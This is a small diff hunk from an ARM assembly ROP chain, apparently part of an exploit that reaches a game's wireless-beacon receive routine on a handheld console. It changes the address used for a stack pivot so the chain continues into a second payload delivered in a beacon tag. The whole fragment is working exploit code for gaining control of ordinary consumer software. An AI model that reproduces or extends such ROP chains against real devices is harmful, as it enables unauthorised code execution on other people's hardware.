@@ -64,7 +64,7 @@ ropstackstart:
 .word NWMUDS_RecvBeaconBroadcastData @ Recv a beacon, with outbuf at BEACONDATA_ADR.
 
 .word POP_LRPC
-.word BEACONTAGDATA_OUITYPE80_ADR - 4 @ lr, later moved into sp.
+.word (BEACONTAGDATA_OUITYPE80_ADR+4) - 4 @ lr, later moved into sp.
 
 .word MOVSPLR_POPLRPC @ Continue ROP with the ROP-chain from smashbros_beacon_rop_payload.s offset 0x4, loaded with NWMUDS_RecvBeaconBroadcastData(beacon tag OUI type 0x80).
 
